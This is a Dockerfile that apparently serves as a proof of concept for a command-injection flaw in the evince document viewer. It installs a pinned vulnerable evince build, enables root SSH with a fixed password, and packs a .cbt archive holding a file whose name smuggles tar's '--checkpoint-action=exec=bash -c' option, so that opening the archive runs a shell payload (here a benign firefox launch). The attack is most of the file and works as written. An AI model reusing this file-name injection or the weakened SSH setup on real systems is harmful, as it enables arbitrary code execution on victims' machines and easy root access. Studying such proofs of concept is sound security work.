# sudo docker build . -t evince-poc
# sudo docker run -d -p 5022:22 evince-poc
# ssh -X root@localhost -p 5022
# evince poc.cbt
FROM debian:sid
ENV SSH_PASSWORD "rootpass"

RUN apt-get -qq update
RUN apt-get install -qq -y supervisor openssh-server nautilus

# Install SSH access
RUN mkdir /var/run/sshd \
&& echo "root:$SSH_PASSWORD" | chpasswd \
&& sed -i 's/^.*PermitRootLogin prohibit-password/PermitRootLogin yes/' /etc/ssh/sshd_config \
&& echo "X11UseLocalhost no" >> /etc/ssh/sshd_config \
&& sed 's@session\s*required\s*pam_loginuid.so@session optional pam_loginuid.so@g' -i /etc/pam.d/sshd \
&& mkdir -p /var/log/supervisor \
&& echo "[supervisord]" >> /etc/supervisor/conf.d/supervisord.conf \
&& echo "nodaemon=true" >> /etc/supervisor/conf.d/supervisord.conf \
&& echo "[program:sshd]" >> /etc/supervisor/conf.d/supervisord.conf \
&& echo "command=/usr/sbin/sshd -D" >> /etc/supervisor/conf.d/supervisord.conf

RUN echo 'deb http://snapshot.debian.org/archive/debian/20160325T212026Z/ sid main contrib non-free' > /etc/apt/sources.list \
&& apt-get -qq -o 'Acquire::Check-Valid-Until=false' update \
&& apt-get -qq -y --allow-downgrades install evince firefox libevdocument3-4=3.20.0-1 libevview3-3=3.20.0-1

RUN apt-get clean && rm -rf /var/lib/apt/lists/*

WORKDIR /root/

ENV PAYLOAD "firefox ensicaen.fr"

RUN dd if=/dev/zero of=" --checkpoint-action=exec=bash -c '$PAYLOAD;'.jpg" bs=1 count=512000
RUN tar cvf poc.cbt *.jpg

EXPOSE 22

CMD [ "/usr/bin/supervisord", "-c",  "/etc/supervisor/conf.d/supervisord.conf" ]
